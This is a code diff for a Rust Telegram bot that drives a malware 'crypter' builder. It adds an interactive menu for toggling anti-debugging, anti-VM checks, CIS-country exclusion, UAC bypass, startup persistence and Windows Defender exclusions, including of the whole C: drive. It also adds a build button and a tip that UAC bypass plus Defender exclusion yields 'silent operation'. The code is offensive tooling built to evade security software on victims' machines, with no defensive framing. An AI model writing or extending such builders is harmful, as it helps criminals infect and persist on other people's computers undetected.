@@ -79,17 +79,19 @@ pub async fn run_telegram_bot() {
     let bot = Bot::from_env();
     let sessions: Sessions = Arc::new(Mutex::new(HashMap::new()));
 
-    let handler = Update::filter_message()
-        .branch(
-            dptree::entry()
-                .filter_command::<Command>()
-                .endpoint(command_handler),
-        )
-        .branch(
-            dptree::filter(|msg: Message| msg.document().is_some())
-                .endpoint(handle_document),
-        )
-        .branch(dptree::endpoint(message_handler));
+    let handler = dptree::entry()
+        .branch(Update::filter_message()
+            .branch(
+                dptree::entry()
+                    .filter_command::<Command>()
+                    .endpoint(command_handler),
+            )
+            .branch(
+                dptree::filter(|msg: Message| msg.document().is_some())
+                    .endpoint(handle_document),
+            )
+            .branch(dptree::endpoint(message_handler)))
+        .branch(Update::filter_callback_query().endpoint(crate::telegram_bot_callbacks::callback_handler));
 
     Dispatcher::builder(bot, handler)
         .dependencies(dptree::deps![sessions])
@@ -271,12 +273,129 @@ async fn handle_document(
     .await?;
 
     // Show configuration menu
-    show_config_menu(&bot, chat_id, sessions.clone()).await?;
+    show_config_menu(bot.clone(), chat_id, sessions.clone()).await?;
 
     Ok(())
 }
 
-async fn show_config_menu(
+pub async fn show_config_menu(
+    bot: Bot,
+    chat_id: ChatId,
+    sessions: Sessions,
+) -> ResponseResult<()> {
+    let sessions_lock = sessions.lock().unwrap();
+    let session = sessions_lock.get(&chat_id).unwrap();
+    let config = &session.config;
+
+    // Create inline keyboard with interactive buttons
+    let keyboard = InlineKeyboardMarkup::new(vec![
+        // Row 1: Anti Debug & Anti VM
+        vec![
+            InlineKeyboardButton::callback(
+                format!("{} Anti Debug", if config.anti_debug { "?" } else { "?" }),
+                "toggle_anti_debug"
+            ),
+            InlineKeyboardButton::callback(
+                format!("{} Anti VM", if config.anti_virtual_machine { "?" } else { "?" }),
+                "toggle_anti_vm"
+            ),
+        ],
+        // Row 2: Blacklist CIS & UAC Bypass
+        vec![
+            InlineKeyboardButton::callback(
+                format!("{} Blacklist CIS", if config.blacklist_cis_countries { "?" } else { "?" }),
+                "toggle_blacklist_cis"
+            ),
+            InlineKeyboardButton::callback(
+                format!("{} UAC Bypass", if config.uac_bypass { "?" } else { "?" }),
+                "toggle_uac_bypass"
+            ),
+        ],
+        // Row 3: Single Instance & Persistence
+        vec![
+            InlineKeyboardButton::callback(
+                format!("{} Single Instance", if config.single_instance { "?" } else { "?" }),
+                "toggle_single_instance"
+            ),
+            InlineKeyboardButton::callback(
+                format!("{} Persistence", if config.run_on_startup { "?" } else { "?" }),
+                "toggle_persistence"
+            ),
+        ],
+        // Row 4: Defender Exclusion & C:\ Drive
+        vec![
+            InlineKeyboardButton::callback(
+                format!("{} Defender {}", 
+                    if config.defender_exclusion { "?" } else { "?" },
+                    if config.uac_bypass && config.defender_exclusion { "??" } else { "" }
+                ),
+                "toggle_defender"
+            ),
+            InlineKeyboardButton::callback(
+                format!("{} C:\\ Drive {}", 
+                    if config.defender_exclude_drive { "?" } else { "?" },
+                    if config.defender_exclude_drive { "??" } else { "" }
+                ),
+                "toggle_drive_exclusion"
+            ),
+        ],
+        // Row 5: Output Format
+        vec![
+            InlineKeyboardButton::callback(
+                format!("?? Output: {}", config.file_extension),
+                "toggle_format"
+            ),
+        ],
+        // Row 6: Build button
+        vec![
+            InlineKeyboardButton::callback(
+                "?? BUILD NOW",
+                "start_build"
+            ),
+        ],
+    ]);
+
+    let menu_text = format!(
+        "?? **Crypter Configuration**\n\n\
+        Click the buttons below to toggle options:\n\
+        ? = Enabled | ? = Disabled\n\n\
+        **Current Settings**:\n\
+        ? Anti Debug: {}\n\
+        ? Anti VM: {}\n\
+        ? Blacklist CIS: {}\n\
+        ? UAC Bypass: {}\n\
+        ? Single Instance: {}\n\
+        ? Persistence: {}\n\
+        ? Defender Exclusion: {} {}\n\
+        ? C:\\ Drive Exclusion: {} {}\n\
+        ? Output Format: **{}**\n\n\
+        {}",
+        if config.anti_debug { "? ON" } else { "? OFF" },
+        if config.anti_virtual_machine { "? ON" } else { "? OFF" },
+        if config.blacklist_cis_countries { "? ON" } else { "? OFF" },
+        if config.uac_bypass { "? ON" } else { "? OFF" },
+        if config.single_instance { "? ON" } else { "? OFF" },
+        if config.run_on_startup { "? ON" } else { "? OFF" },
+        if config.defender_exclusion { "? ON" } else { "? OFF" },
+        if config.uac_bypass && config.defender_exclusion { "?? Silent with UAC!" } else { "" },
+        if config.defender_exclude_drive { "? ON" } else { "? OFF" },
+        if config.defender_exclude_drive { "?? AGGRESSIVE!" } else { "" },
+        config.file_extension,
+        if config.uac_bypass && config.defender_exclusion {
+            "?? **Pro Tip**: UAC + Defender = Silent operation!"
+        } else { "" }
+    );
+
+    drop(sessions_lock);
+    bot.send_message(chat_id, menu_text)
+        .reply_markup(keyboard)
+        .await?;
+    
+    Ok(())
+}
+
+// Legacy text-based config menu for backwards compatibility
+async fn show_config_menu_legacy(
     bot: &Bot,
     chat_id: ChatId,
     sessions: Sessions,
@@ -392,7 +511,7 @@ pub async fn handle_config_toggle(
     Ok(updated)
 }
 
-async fn start_build_process(
+pub async fn start_build_process(
     bot: Bot,
     chat_id: ChatId,
     sessions: Sessions,
